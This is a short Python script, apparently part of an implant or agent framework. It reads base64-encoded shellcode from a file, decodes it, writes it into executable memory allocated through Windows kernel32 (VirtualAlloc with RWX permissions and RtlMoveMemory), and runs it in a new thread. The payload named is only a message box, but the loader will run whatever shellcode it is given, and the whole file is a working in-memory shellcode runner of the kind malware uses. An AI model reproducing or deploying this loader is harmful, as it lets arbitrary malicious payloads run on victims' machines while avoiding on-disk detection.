import ctypes
import threading
import subprocess
import base64

class ExecuteShellcode(threading.Thread):

    def __init__(self, jobid, shellc):
        threading.Thread.__init__(self)
        self.shellc = shellc
        self.jobid = jobid

        self.daemon = True
        self.start()

    def run(self):
        try:
            print("running shellcode...")
            shellcode = bytearray(self.shellc)

            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                ctypes.c_int(len(shellcode)),
                ctypes.c_int(0x3000),
                ctypes.c_int(0x40))

            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

            ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.c_int(ptr),
                ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.pointer(ctypes.c_int(0)))

            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

        except Exception as e:
            print (e)
            pass


file = open("shellcodes/messageBox.b64", "r") 
shell_b64 = file.read() 
shellcode = base64.b64decode(shell_b64)


ExecuteShellcode(1, shellcode)